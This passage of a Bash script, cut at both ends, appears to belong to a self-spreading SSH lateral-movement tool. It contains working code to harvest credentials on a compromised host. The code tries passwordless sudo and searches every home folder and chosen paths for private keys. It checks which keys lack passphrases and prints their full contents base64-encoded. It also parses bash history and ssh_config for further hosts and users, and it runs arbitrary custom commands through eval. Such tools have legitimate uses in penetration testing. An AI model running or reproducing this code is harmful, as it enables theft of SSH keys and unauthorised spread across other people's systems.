| base64 -d >/dev/null 2>&1; then\n    printf \"Usage: bash %s >output.log\\n\" \"$0\"\n    exit 1\n  fi\n}\n\n# Prints the current $ignore_separator$user@$current_hostnames_ip$ignore_separator and exits.\n# Also print the ignore list for $current_hosts_ip if $current_hosts_ip is set (aka $user@$current_hosts_ip is not in $current_hostnames_ip)\n# This should only be called on a successful scan.\nfin() {\n  printf \"INTERNAL_MSG: ignore list: %s%s@%s%s\\n\" \"$ignore_separator\" \"$user\" \"$current_hostnames_ip\" \"$ignore_separator\"\n  #  [[ -n \"$current_hosts_ip\" ]] && printf \"INTERNAL_MSG: ignore list: %s%s@%s%s\\n\" \"$ignore_separator\" \"$user\" \"$current_hosts_ip\" \"$ignore_separator\" # XXX: Is this smart to do? Probably not: disabled until further notice.\n\n  exit 0\n}\n\n# If use_sudo is set, we check whether we are able to use sudo.\n# If we can use sudo, set $s with the sudo command.\ncheck_sudo() {\n  [[ $use_sudo -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s=\"sudo\"\n}\n\n# Different versions of ssh-keygen support different options.\n# Older versions of ssh-keygen do not support the -E argument to specify the hashing method of a public key, instead only allowing MD5.\n# Therefore, check whether we can use -E, and if not, set $sshkeygen to ssh-keygen -lf.\ncheck_sshkeygen() {\n  [[ \"$(ssh-keygen -E 2>&1)\" == *\"unknown option\"* ]] && sshkeygen=(\"ssh-keygen\" \"-l\" \"-f\")\n}\n\n# Older versions of ssh-keygen do not support the appending of HostkeyAlgorithms and KexAlgorithms values.\n# Don't use them unless they're supported.\ncheck_ssh_options() {\n  local ssh_extra_options\n  local ssh_extra_option\n\n  ssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1)\n  for ssh_extra_option in \"${ssh_extra_options[@]}\"; do\n    [[ \"$(ssh \"$ssh_extra_option\" 2>&1)\" =~ Bad\\ protocol\\ 2\\ host\\ key\\ algorithms|Bad\\ SSH2\\ KexAlgorithms|Bad\\ key\\ types|diffie-hellman-group1-sha1|ssh-rsa ]] || ssh_options+=(\"$ssh_extra_option\")\n  done\n  ssh_extra_option=\"-oPubkeyAcceptedKeyTypes=+ssh-rsa\"\n  [[ \"$(ssh \"$ssh_extra_option\" 2>&1)\" =~ Bad\\ configuration\\ option|pubkeyacceptedkeytypes ]] || ssh_options+=(\"$ssh_extra_option\")\n}\n\n# Determining the ip address of the current destination is difficult because it may have multiple ip addresses, and we are likely to connect to both of them eventually (including 127.0.0.1 for example).\n# This means that we effectively have multiple hosts despite it being the same destination, meaning pathways may be left mangled (A->B->C exists, and A->C exists too but with a different ip address).\n# Therefore, we take two strategies for finding and printing the addresses of the destination.\n#\n# Firstly, define the current destination's address as the concatenation of all of its ipv4 addresses: IP_1:IP_2:IP_3. The output of that will be:\n# user@(IP_1:IP_2:IP_3)[keyfile]->user@(IP_1:IP_2:IP_3)[keyfile]->user@(IP_1:IP_2:IP_3)....\n# This output isn't particuarly useful for using to actually connect to hosts using the data, but it is useful for creating graphs (because each destination will correspond to a collection of ip addresses).\n# This format of ip address is also useful for the script to determine whether a destination has already been scanned or not (aka whether the destination are in the ignore_list).\n# Therefore, we split all ips for this host and add a separator \":\", which we use for the ignore_list as well.\n#\n# Secondly, we determine the destination's address which the script actually used to connect to this server:\n# user@host[keyfile]->user@host[keyfile]->user@host\n# This output is useful to see what the script actually did, and can therefore be used to recreate the ssh command needed to get from server A to server B.\ninit_current_ips() {\n  local current_ip\n  local default_route\n  local default_ip\n  local iface\n\n  # Create the current_ips array containing all of the ipv4 addresses of the destination.\n  while IFS= read -r current_ip; do\n    current_ips[\"$current_ip\"]=1\n  done < <(${s} hostname -I 2>/dev/null | tr ' ' '\\n' | grep -F '.')\n\n  # mac support\n  while IFS= read -r iface; do\n    while IFS= read -r current_ip; do\n      current_ips[\"$current_ip\"]=1\n    done < <(${s} ipconfig getifaddr \"$iface\" 2>/dev/null)\n  done < <(${s} ifconfig -l 2>/dev/null | tr ' ' '\\n')\n\n  current_hostnames_ip=\"$(IFS=:; echo \"${!current_ips[*]}\")\"\n\n  # Then, determine the ip address for connecting to the default gateway. Otherwise, to the internet.\n  # sudo is required on some systems, so use it if possible.\n  if ip route show default >/dev/null 2>&1; then\n    default_route=\"$(${s} ip route show default 2>/dev/null | awk '/default via/{print $3; exit}')\"\n    default_route=\"${default_route:-\"1.1.1.1\"}\"\n    default_ip=\"$(${s} ip route get \"$default_route\" 2>/dev/null | awk -F'src' '{print $NF; exit}' | awk '{print $1}')\"\n  elif route -n get 1.1.1.1 >/dev/null 2>&1; then\n    iface=\"$(${s} route -n get 1.1.1.1 2>/dev/null | awk '/interface: / {print $2;exit}')\"\n    default_ip=\"$(${s} ipconfig getifaddr \"$iface\" 2>/dev/null)\"\n  fi\n\n  default_ip=\"${default_ip:-\"???\"}\"\n\n  # If $this_host has not been passed to us, set our address to the default ip address.\n  this_host=\"${this_host:-\"$default_ip\"}\"\n\n  # If hostname -I does not work, then just fill the array with $this_host.\n  [[ ${#current_ips[@]} -eq 0 ]] && current_ips[\"$this_host\"]=1 && current_hostnames_ip=\"$this_host\"\n}\n\n# Initialize this server/destination's chains.\n# Using both chains provided to the script by the $2 and $5 arguments, we combine them with the current username and ip addresses, separated by ->.\ninit_chains() {\n  # Initalize the hosts_chain. This chain is the real pathway we used to access this server/destination.\n  # For example, user@host[key]->user@host.\n  hosts_chain=\"$hosts_chain${hosts_chain:+->}$user@$this_host\"\n  # Initalize the hostnames_chain. This chain is not the exact pathway in the network sense, but rather the pathway of unique servers (independent of the ip address we used to access them).\n  # For example, user@(host)[key]->user@(host:host:host:host)\n  hostnames_chain=\"$hostnames_chain${hostnames_chain:+->}$user@($current_hostnames_ip)\"\n}\n\n# Determine the length of the indentation based on the current chain's length\n# Which chain does not matter, but we use hosts_chain.\n# For each \"]->\", we want to indent 1 characters.\n# To determine the amount of ]-> instances, we loop through the chain and continuously cut where it's found.\ninit_indent() {\n  local recursive_indent_length\n  local temp_chain\n  local pattern\n\n  pattern=']->'\n  temp_chain=\"$hosts_chain\"\n  recursive_indent_length=0\n\n  while [[ \"$temp_chain\" == *\"$pattern\"* ]]; do # XXX: Should we just use grep -c?\n    ((recursive_indent_length++))\n    temp_chain=\"${temp_chain#*\"$pattern\"}\" # Cut the temp. chain at the first ]->\n  done\n\n  indent=\"$(printf \"%*s\" $recursive_indent_length \"\")\"\n}\n\n# Print a line beginning with the appropriate indent and hosts_chain, and anything afterwards.\n# We use hosts_chain here because it makes more sense to describe the current address.\n# Argument $1 is what to print after the chain.\nchained_print() {\n  printf \"%s%s%s\\n\" \"$indent\" \"$hosts_chain\" \"$1\"\n}\n\n# Parse the settings ignored_users, ignored_hosts and ignored_dests, and populate their corresponding internal arrays.\n# Quit if this user, host, or destination is ignored, too (how did we get here?)\ninit_ignored() {\n  local ignored_user\n  local ignored_host\n  local ignored_dest\n  local current_ip\n\n  for ignored_user in \"${ignored_users[@]}\"; do\n    is_ssh_user \"$ignored_user\" && _ignored_users[\"$ignored_user\"]=1\n    [[ \"$ignored_user\" == \"$user\" ]] && fin\n  done\n\n  for ignored_host in \"${ignored_hosts[@]}\"; do\n    is_ssh_host \"$ignored_host\" && _ignored_hosts[\"$ignored_host\"]=1\n    [[ -v 'current_ips[\"$ignored_host\"]' || ${#current_ips[\"$ignored_host\"]} -gt 0 ]] && fin\n  done\n\n  for ignored_dest in \"${ignored_dests[@]}\"; do\n    is_ssh_dest \"$ignored_dest\" && _ignored_dests[\"$ignored_dest\"]=1\n    for current_ip in \"${!current_ips[@]}\"; do\n      [[ \"$ignored_dest\" == \"$user@$current_ip\" ]] && fin\n    done\n  done\n}\n\n# Load all of the destinations from the ignore_list into the ignore_list_array array.\nload_ignore_list_array() {\n  local line\n\n  while IFS= read -r line; do\n    ignore_list_array[\"$line\"]=1\n  done < <(echo \"$ignore_list\" | tr '|' '\\n'  | awk -F'[@:]' -v OFS='@' '\n    {\n      user = $1\n      for (i = 2; i <= NF; i++) {\n        if ($i != \"\" && user != \"\") {\n          print user \"@\" $i\n        }\n      }\n    }'\n  )\n}\n\n# Determine whether the current server has already been scanned.\n# If it has already been scanned (or is in the process of being scanned), finish.\n# Otherwise, add the current destination to the ignore list (even though it has not been scanned yet, but to avoid further destinations scanned from this one going in a circle).\n# If ignore_user is set, we check whether the current _host_ (not destination) alone has been scanned.\n# Also fill the ignore_list_array array with a list of all the demangled dests from ignore_list.\ncheck_for_recursion() {\n  [[ $ignore_user -eq 1 ]] && [[ \"$ignore_list\" == *\"@$current_hostnames_ip$ignore_separator\"* ]] && fin\n\n  [[ \"$ignore_list\" == *\"$ignore_separator$user@$current_hostnames_ip$ignore_separator\"* ]] && fin\n\n  ignore_list+=\"$ignore_separator$user@$current_hostnames_ip$ignore_separator\"\n\n  load_ignore_list_array\n\n  # In general, if a destination has more than one ip address, the script doesn't really care about the individual addresses for the sake of checking for recursion.\n  # However, individual addresses are useful for discovery of dests (from ignore_list_array for example from find_from_ignore_list).\n  # Therefore, if $user@$this_host is not present in the demangled list of dests, add it. That is to say, if we've connected to this destination by user@this_host, and this_host is somehow not present on this server, add it.\n  # This will also be printed when we fin(), via $current_hosts_ip.\n  # XXX: Is this smart to do? Probably not: disabled until further notice.\n  #  [[ -v ignore_list_array[\"$user@$this_host\"] || ${#ignore_list_array[\"$user@$this_host\"]} -gt 0 ]] && return\n  #  current_hosts_ip=\"$this_host\"\n  #  ignore_list+=\"$ignore_separator$user@$this_host$ignore_separator\"\n  #  ignore_list_array[\"$user@$this_host\"]=1\n}\n\n# Sets up and initializes internal variables and options.\nsetup() {\n  check_startup\n\n  check_sudo\n  check_sshkeygen\n  check_ssh_options\n\n  init_current_ips\n  init_chains\n\n  init_indent\n\n  # Print the normal hosts_chain.\n  chained_print \"\"\n  # Print the hostnames_chain.\n  printf \"%s%s\\n\" \"$indent\" \"$hostnames_chain\"\n\n  init_ignored # We deal with any ignores users, hosts, and dests after printing the destination information because we want to know how we got here, but we don't want to scan.\n\n  check_for_recursion # We check for recursion after printing where we are because we only want to avoid scanning the destination if it's already been fully scanned. We still want to list how we got here.\n}\n\n# If we're using use_retry_all_dests, we don't want to scan for any users/hosts/dests on any dests that we have already scanned, we just want to find keys on those destinations.\n# Therefore, if using use_retry_all_dests, no-op the addition of hosts/dests/users.\n# Then, manually add all interesting_dests values into ssh_dests.\n# Since interesting_dests is filled with the demangled destinations (effectively a demangled ignore_list), we check whether each of this destination's $user@$ip is in interesting_dests.\n# If all of this destination's $user@$ips are in interesting_dests, we assume we are 'revisiting' this server, so do not perform scanning for users/hosts/dests.\nretry_all_dests() {\n  local current_ip\n  local ssh_dest\n\n  [[ $use_retry_all_dests -eq 2 ]] || return\n\n  for current_ip in \"${!current_ips[@]}\"; do\n    if [[ \" ${interesting_dests[*]} \" != *\" $user@$current_ip \"* ]]; then # TODO: remove this loop? turn it into exit?\n      return # XXX: Should we report that this is a NEW destination?\n    fi\n  done\n\n  # no-op\n  add_ssh_dest() { :; }\n  add_ssh_host() { :; }\n  add_ssh_user() { :; }\n\n  for ssh_dest in \"${interesting_dests[@]}\"; do\n    is_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1\n  done\n}\n\n# Execute any custom commands, and print any output.\n# XXX: If you want this to execute after the destination has been scanned, move the exec_cusom_cmds call to fin().\nexec_custom_cmds() {\n  local cmd\n\n  for cmd in \"${custom_cmds[@]}\"; do\n    local output\n    output=\"$(eval \"$cmd\" 2>&1| base64 | tr -d '\\n')\"\n    chained_print \": EXTERNAL_MSG: CMD[$cmd]: $output\"\n  done\n}\n\n# Creates a list of home folders using both getent passwd(/etc/passwd) (if possible) and listing the directories in /home/ and /Users.\n# /home/ may contain deleted users' data still, therefore /etc/passwd is not completely reliable.\nfind_home_folders() {\n  local home_folder\n\n  while IFS= read -r home_folder; do\n    [[ -v 'home_folders[\"$home_folder\"]' || ${#home_folders[\"$home_folder\"]} -gt 0 ]] && continue\n    home_folder=\"$(readlink -f -- \"$home_folder\" 2>/dev/null)\"\n    is_dir \"$home_folder\" && home_folders[\"$home_folder\"]=1\n  done < <(${s} find -L \"/home\" \"/Users\" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)\n\n  while IFS=: read -r _ _ _ _ _ home_folder _; do\n    [[ -v 'home_folders[\"$home_folder\"]' || ${#home_folders[\"$home_folder\"]} -gt 0 ]] && continue\n    home_folder=\"$(readlink -f -- \"$home_folder\" 2>/dev/null)\"\n    is_dir \"$home_folder\" && home_folders[\"$home_folder\"]=1\n  done < <(getent passwd 2>/dev/null)\n}\n\n# Discovers all files in the .ssh/ directories of all home folders.\ninit_ssh_files() {\n  local home_folder\n\n  for home_folder in \"${!home_folders[@]}\"; do\n    local ssh_folder\n    local ssh_file\n\n    ssh_folder=\"$home_folder/.ssh\"\n    is_dir \"$ssh_folder\" || continue\n\n    while IFS= read -r ssh_file; do\n      is_file \"$ssh_file\" || continue\n      ssh_files[\"$ssh_file\"]=1\n    done < <(${s} find -L \"$ssh_folder\" -type f 2>/dev/null)\n  done\n}\n\n# Check whether a file is an SSH private key.\ncheck_file_for_privkey() {\n  local known_key_headers\n  local key_file\n  local key_header\n  local file_header\n\n  key_file=\"$1\"\n  known_key_headers=(\n      \"SSH PRIVATE KEY FILE FORMAT 1.1\"\n      \"-----BEGIN RSA PRIVATE KEY-----\"\n      \"-----BEGIN DSA PRIVATE KEY-----\"\n      \"-----BEGIN EC PRIVATE KEY-----\"\n      \"-----BEGIN OPENSSH PRIVATE KEY-----\"\n      \"-----BEGIN PRIVATE KEY-----\"\n      \"-----BEGIN ENCRYPTED PRIVATE KEY-----\"\n      \"---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\"\n    )\n\n  is_file \"$key_file\" || return 1\n\n  read -r -n 50 file_header < <(${s} cat -- \"$key_file\" 2>/dev/null) # cat is faster than head.\n  for key_header in \"${known_key_headers[@]}\"; do\n    if [[ \"$file_header\" == *\"$key_header\"* ]]; then\n      return 0\n    fi\n  done\n\n  return 1\n}\n\n# Given the location of a potential ssh private key, determine whether we can use the private key for ssh. If so, populate the priv_keys array which contains keys that we will ssh with.\n#\n# First we attempt to generate a public key for the file using ssh-keygen -yf with an invalid password. If the private key does not have a password, the invalid password does not affect the public-key generation. If the private key does have a passphrase, an error occurs.\n# On old ssh-keygen versions, using ssh-keygen -yf on files with too-permissive permissions (regardless of (whether it has a passphrase or not) forces a prompt. By specifying a passphase, this prompt is avoided.\n# Therefore, if ssh-keygen -yf fails, we are dealing with any of: 1) a file which is not a private key, 2) a file with invalid permissions, or 3) a private key with a passphrase (or a combination thereof).\n# If ssh-keygen -yf's stderr includes \"invalid format\", the file is not a private key.\n#\n# If ssh-keygen -yf succeeds, we are dealing with a file which is an unprotected private key file.\n#\n# There are quite a lot of different failure cases which may be considered, such as (possibly not exhaustive):\n# Permission issues on [keyfile], missing [keyfile].pub files (for old versions of ssh-keygen), missing [keyfile].pub files for PEM formatted keys, all protected keys with missing [keyfile].pub (for old ssh-keygen), permission issues on [keyfile] while missing [keyfile].pub and using an extremely old version of ssh-keygen.\n# [keyfile] could also not be a valid key at all.\n#\n# It's all a big mess, which is probably impossible to solve with ssh-keygen itself.\n# Therefore, we don't mess around with it and simply use the pubkey as the key for the array of private keys, and the value is the location of the key.\n# Also print the key's contents.\npopulate_keys() {\n  local ssh_pubkey\n  local ssh_pubkey_ret\n  local key_file\n\n  key_file=\"$1\"\n\n  # ssh-keygen -yf attempts to calculate the public key from the private key.\n  # Even if there is no passphrase, use -P because old versions of ssh-keygen start an interactive prompt if there are permission errors.\n  ssh_pubkey=\"$(${s} ssh-keygen -P NOT_VALID4SURE -yf \"$key_file\" 2>&1)\"\n  ssh_pubkey_ret=$?\n  # Ignore the file if it isn't found (race condition?)\n  # On new versions of ssh-keygen, an error is produced if the file is not a private key file.\n  if [[ \"$ssh_pubkey\" == *\"invalid format\"* || \"$ssh_pubkey\" == *\"No such file or directory\"* ]]; then\n    return 1\n  fi\n\n  if [[ $ssh_pubkey_ret -eq 0 ]]; then\n    chained_print \": Discovered usable private key in [$key_file]\"\n    priv_keys[\"$ssh_pubkey\"]=\"$key_file\"\n  else\n    chained_print \": Discovered unusable private key in [$key_file]\"\n\n  fi\n  chained_print \": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- \"$key_file\" 2>/dev/null | base64 | tr -d '\\n')\"\n  return 0\n}\n\n# Checks whether a file is a key, and if so, attempts to populate the priv_keys array with the location.\n# Drops any files which are either user-set to be ignored or ignored for other reasons (such as already searched).\n# In all cases, populate the location of files in key_files arrays, so we don't perform this function twice on the same file.\ncheck_and_populate_keys() {\n  local unresolved_key_file\n  local key_file\n  local ignored_key_file\n\n  unresolved_key_file=\"$1\"\n\n  [[ -z \"$unresolved_key_file\" ]] && return 1\n\n  # Avoid the readlink call if the path is already absolute.\n  [[ -v 'priv_keys_files[\"$unresolved_key_file\"]' || ${#priv_keys_files[\"$unresolved_key_file\"]} -gt 0 ]] && return 0\n  [[ -v 'key_files[\"$unresolved_key_file\"]' || ${#key_files[\"$unresolved_key_file\"]} -gt 0 ]] && return 1\n\n  key_file=\"$(${s} readlink -f -- \"$unresolved_key_file\" 2>/dev/null)\" # use sudo because it may be a symlink in a priviliged location, not that it would really matter (ssh will just use the symlink)\n\n  [[ -z \"$key_file\" ]] && key_files[\"$unresolved_key_file\"]=1 && return 1\n\n  [[ -v 'priv_keys_files[\"$key_file\"]' || ${#priv_keys_files[\"$key_file\"]} -gt 0 ]] && priv_keys_files[\"$unresolved_key_file\"]=1 && return 0\n  [[ -v 'key_files[\"$key_file\"]' || ${#key_files[\"$key_file\"]} -gt 0 ]] && key_files[\"$unresolved_key_file\"]=1 && return 1\n\n  key_files[\"$unresolved_key_file\"]=1\n  key_files[\"$key_file\"]=1\n\n  for ignored_key_file in \"${ignored_key_files[@]}\"; do\n    [[ \"$key_file\" == $ignored_key_file ]] && return 1\n  done\n\n  if check_file_for_privkey \"$key_file\"; then\n    populate_keys \"$key_file\" && priv_keys_files[\"$key_file\"]=1 && priv_keys_files[\"$unresolved_key_file\"]=1 && return 0\n  fi\n\n  return 1\n}\n\n# Attempts to discover any ssh private keys in the home folder .ssh/ files which have previously been discovered.\nfind_ssh_keys() {\n  local ssh_file\n\n  for ssh_file in \"${!ssh_files[@]}\"; do\n    check_and_populate_keys \"$ssh_file\"\n  done\n}\n\n# Attempts to discover any ssh private keys in the user set $scan_paths paths.\nfind_ssh_keys_paths() {\n  local ssh_file\n\n  while IFS= read -r ssh_file; do\n    check_and_populate_keys \"$ssh_file\"\n  done < <(${s} find -L ${scan_paths[@]} -maxdepth \"$scan_paths_depth\" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null) # Longest key is ---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----. We lose \"SSH PRIVATE KEY FILE FORMAT 1.1\" but oh well.\n}\n\n# Given a key file path and a home directory, determine whether the key exists and corresponds to a private key or not using the appropriate home directory location where necessary.\n# This converts ~/ and relative paths to their appropriate locations based on the home_folder location.\ncheck_potential_key_files() {\n  local key_file\n  local home_folder\n  local potential_key_file\n\n  key_file=\"$1\"\n  home_folder=\"$2\"\n\n  for potential_key_file in \"$key_file\" \"$home_folder/${key_file:1}\" \"$home_folder/$key_file\"; do\n    check_and_populate_keys \"$potential_key_file\" && return 0\n  done\n\n  return 1\n}\n\n# Attempts to find users, hosts, destinations, and private keys from bash history files.\n# Due to the multitude of arguments that ssh may take, we parse each bash_history file and then tokenize the line.\n# In reality, we look for any calls to ssh, scp, and rsync, and parse the tokens appropriately. This is extremely difficult as we're emulating execve's job with unreliable, arbitrary data.\n#\n# In all cases, we attempt to parse the standard user@host.\n#\n# In the case of scp and ssh:\n#\n# We discover private keys by matching the \"-i\" flag in the form of \"-i file\" or \"-ifile\".\n# The -i flag is used in various ways: -i /home/user/.ssh/id_rsa, -i ~/.ssh/id_rsa, or -i .ssh/id_rsa.\n# In the first case, we can simply check whether the key exists and is a key, and populate our list of keys: check_and_populate_keys /home/user/.ssh/id_rsa.\n# In the second case, we replace the ~ character with the home directory for which we are parsing the bash_history file: check_and_populate_keys $home_directory/.ssh/id_rsa.\n# In the last case, we prepend the home directory for which we are parsing the bash_history file: check_and_populate_keys $home_directory/.ssh/id_rsa.\n#\n# In the case of ssh:\n#\n# The -l flag can be used to specify the username of the remote destination. For example, ssh host -l root, or ssh host -lroot.\n# We parse both cases, and add them to ssh_users. For the life-time of the bash history LINE, we also save the username.\n#\n# In the case of both scp and ssh, we are generally parsing lines which may or may not include usernames, hosts, destinations, keys, arguments, and commands to run on the remote server.\n# This complicates things slightly, as the following:\n# ssh -v -i .ssh/id_rsa -l user host 'ps auxf'\n# needs to be parsed very carefully.\n# We also need to ensure we don't parse too much of the line to include commands that are passed to the ssh session (e.g. ssh -luser host 'ps')\n# Therefore, for each line that is parsed, we also cache the username and host that is parsed (if possible). If a username and host are parsed, we stop processing the line (unless the `-i` flag is detected but the key has not been retrieved yet).\n# If no username is parsed for the whole line, we guess the username is that of the user whose home directory we are looking at.\nfind_from_bash_history() {\n  local home_folder\n\n  for home_folder in \"${!home_folders[@]}\"; do\n    local home_file\n    local bash_history_line\n    local home_user\n\n    home_file=\"$home_folder/.bash_history\"\n    is_file \"$home_file\" || continue\n\n    home_user=\"$(basename -- \"$home_folder\" 2>/dev/null)\"\n\n    while IFS= read -r bash_history_line; do\n      local ssh_dest\n      local tokens\n      local i\n      local cached_ssh_user\n      local cached_ssh_host\n      local cached_ssh_key\n\n      cached_ssh_user=\"\"\n      cached_ssh_host=\"\"\n      cached_ssh_key=\"\"\n\n      # ssh user@host ; extract user@host\n      # scp file user@host:~/ ; extract user@host\n      # scp user@host:~/file ./ ; extract user@host\n      # rsync -a * user@host:~/ ; extract user@host\n      if ssh_dest=\"$(echo \"$bash_history_line\" | grep -m 1 -oE \"$allowed_users_chars\"'@[^ :]+')\"; then # TODO: doesn't work when matches multiple (-3).\n        local ssh_host\n        local ssh_user\n\n        ssh_host=\"${ssh_dest#*@}\"\n        ssh_user=\"${ssh_dest%%@*}\"\n\n        add_ssh_dest \"$ssh_dest\" && cached_ssh_user=\"$ssh_user\" && cached_ssh_host=\"$ssh_host\"\n\n      # scp file host:~/ ; extract host\n      # scp host:~/file ./ ; extract host\n      elif [[ \"$bash_history_line\" == \"scp \"* ]]; then\n        local ssh_host\n\n        ssh_host=\"$(echo \"$bash_history_line\" | grep -m 1 -o -E '[^ ]+:')\"\n        ssh_host=\"${ssh_host%:}\"\n\n        add_ssh_dest \"$home_user@$ssh_host\" && cached_ssh_user=\"$home_user\" && cached_ssh_host=\"$ssh_host\"\n      fi\n\n      [[ \"$bash_history_line\" == \"rsync \"* ]] && continue\n\n      read -ra tokens < <(printf \"%s\" \"$bash_history_line\")\n      for ((i=0; i<${#tokens[@]}; i++)); do\n        local token\n\n        # Break if we've already determined a host and username, and there is no more information to gather.\n        [[ -n \"$cached_ssh_user\" && -n \"$cached_ssh_host\" ]] && [[ \"$bash_history_line\" != *\" -i\"* || -n \"$cached_ssh_key\" ]] && break\n        [[ -n \"$cached_ssh_host\" && -z \"$cached_ssh_user\" && \"$bash_history_line\" != *\" -l\"* ]] && [[ \"$bash_history_line\" != *\" -i\"* || -n \"$cached_ssh_key\" ]] && break\n\n        token=\"${tokens[$i]}\"\n\n        [[ \"$token\" == \"ssh\" ]] && continue\n        [[ \"$token\" == \"scp\" ]] && continue\n\n        # ssh -i.ssh/id_rsa host ; extract .ssh/id_rsa\n        # ssh -i .ssh/id_rsa host ; extract .ssh/id_rsa\n        if [[ \"$token\" == \"-i\"* ]]; then\n          local key_file\n\n          if [[ ${#token} -gt 2 ]]; then\n            key_file=\"${token:2}\"\n          elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then\n            key_file=\"${tokens[$i+1]}\"\n          else\n            continue\n          fi\n          # Depending on the line, it could be an absolute path, ~/ expansion, or relative like .ssh/id_rsa.\n          check_potential_key_files \"$key_file\" \"$home_folder\" && cached_ssh_key=\"$key_file\"\n        # ssh -luser host ; extract user\n        # ssh -l user host ; extract user\n        elif [[ \"$token\" == \"-l\"* ]]; then\n          local ssh_user\n\n          if [[ ${#token} -gt 2 ]]; then\n            ssh_user=\"${token:2}\"\n          elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then\n            ssh_host=\"${tokens[$i+1]}\"\n          else\n            continue\n          fi\n          [[ -z \"$cached_ssh_user\" ]] && add_ssh_user \"$ssh_user\" && cached_ssh_user=\"$ssh_user\"\n        else\n          [[ \"$token\" == \"-\"* ]] && continue\n          # Should always be true since we continue on token = [ssh|scp|rsync]\n          [[ $i -gt 0 ]] || continue\n          local prev_token\n          local prev_prev_token\n\n          # match on the PREVIOUS token.\n          prev_token=\"${tokens[$i-1]}\"\n          [[ $i -gt 1 ]] && prev_prev_token=\"${tokens[$i-2]}\"\n          [[ \"$bash_history_line\" == \"ssh \"* ]] || continue\n          if [[ \"$prev_token\" == \"-\"* ]]; then\n            # ssh -v host ; extract host\n            # ssh -p22 host ; extract host\n            # ssh -vv host ; extract host\n            # ssh -oOption=yes host ; extract host\n            # ssh -i file host -luser ps ; do NOT extract 'ps' (cached_ssh_host already set)\n            # ssh host -v 'bash -c ls' ; do NOT extract 'bash (cached_ssh_host already set).\n            if [[ \"$prev_token\" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ || ${#prev_token} -gt 2 ]]; then\n              local ssh_host\n\n              ssh_host=\"$token\"\n              [[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\n            fi\n          # ssh host ; extract host.\n          # ssh -v host ; do NOT extract -v.\n          elif [[ \"$prev_token\" == \"ssh\" ]]; then\n            local ssh_host\n            local ssh_user\n\n            ssh_host=\"$token\"\n            [[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\n          # ssh -i key host ; extract host\n          # ssh -vv -o Option=yes host ; extract host\n          # ssh -v host 'ps' ; do NOT extract anything. (especially 'ps')\n          # ssh -v -p22 host 'ps' ; do NOT extract anything (especially 'ps')\n          # ssh -D 9000 localhost -luser ; extract host\n          # ssh -i file -v -luser host ps ; do NOT extract 'ps' (cached_ssh_host already set)\n          elif [[ $i -gt 1 && \"$prev_prev_token\" == \"-\"* ]] && [[ ! \"$prev_prev_token\" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ && ! ${#prev_prev_token} -gt 2 ]]; then\n            local ssh_host\n\n            ssh_host=\"$token\"\n            [[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\n          # ssh -l user host ps ; break on ps.\n          # ssh host command ; break on command.\n          # ssh -i /file/ -l user host cmd ; break on cmd.\n          elif [[ $i -gt 1 && \"${prev_prev_token:0:1}\" != \"-\" && \"${prev_token:0:1}\" != \"-\" ]]; then\n            break\n          else\n            # Shouldn't be necessary, but can get rid of trailing commands, complicated cases (sigh).\n            break\n          fi\n        fi\n      done\n      [[ -z \"$cached_ssh_user\" ]] && add_ssh_user \"$home_user\" && cached_ssh_user=\"$home_user\" # XXX: Can we parse ssh_config and detect Host [host] corresponds to a user, instead?\n\n      [[ -n \"$cached_ssh_user\" && -n \"$cached_ssh_host\" ]] && add_ssh_dest \"$cached_ssh_user@$cached_ssh_host\"\n    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- \"$home_file\" 2>/dev/null | sort | uniq)\n  done\n}\n\n# Attempt to find usernames, hosts, and key files from ssh_config files.\n# An example of an ssh_config file:\n# Host example.com\n#   Hostname example.com\n#   User your_username\n#   IdentityFile ~/.ssh/id_rsa\n#\n# We parse both Host and Hostname (since Hostname is optional).\n# We also deal with IdentityFile when it begins with a ~ or a relative path.\n#\n# Unfortunately, we don't create ssh_dests based on the results because we parse the file line-by-line. We could probably make this work properly if we reset the variable when there's an empty line.\nfind_from_ssh_config() {\n  local home_folder\n\n  for home_folder in \"${!home_folders[@]}\"; do\n    local ssh_file\n    local home_user\n\n    is_dir \"$home_folder/.ssh\" || continue\n\n    home_user=\"$(basename -- \"$home_folder\" 2>/dev/null)\"\n\n    while IFS= read -r ssh_file; do\n      is_file \"$ssh_file\" || continue\n\n      local cline\n\n      while IFS= read -r cline; do\n        local cline_val\n        local cline_key\n\n        cline_val=\"$(echo \"$cline\" | awk '{print $NF}')\" # Might be tab or space\n        cline_key=\"$(echo \"$cline\" | awk '{print $1}')\" # Might be tab or space\n        cline_key=\"${cline_key,,}\"\n\n        [[ -z \"$cline_val\" ]] && continue\n        [[ -z \"$cline_key\" ]] && continue\n\n        case \"$cline_key\" in\n          \"host\")\n            add_ssh_host \"$cline_val\"\n            [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$cline_val\"\n            ;;\n          \"hostname\")\n            add_ssh_host \"$cline_val\"\n            [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$cline_val\"\n            ;;\n          \"user\")\n            add_ssh_user \"$cline_val\"\n            ;;\n          \"identityfile\")\n            check_potential_key_files \"$cline_val\" \"$home_folder\"\n            ;;\n        esac\n      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- \"$ssh_file\" 2>/dev/null | sort | uniq)\n    done < <(${s} find -L \"$home_folder/.ssh\" -type f 2>/dev/null)\n  done\n}\n\n# A small hacky way to retrieve the username which corresponds to a file in a home directory.\nfind_user_from_file() {\n  local home_folder\n\n  for home_folder in \"${!home_folders[@]}\"; do\n    if [[ \"$1\" == \"$home_folder\"* ]]; 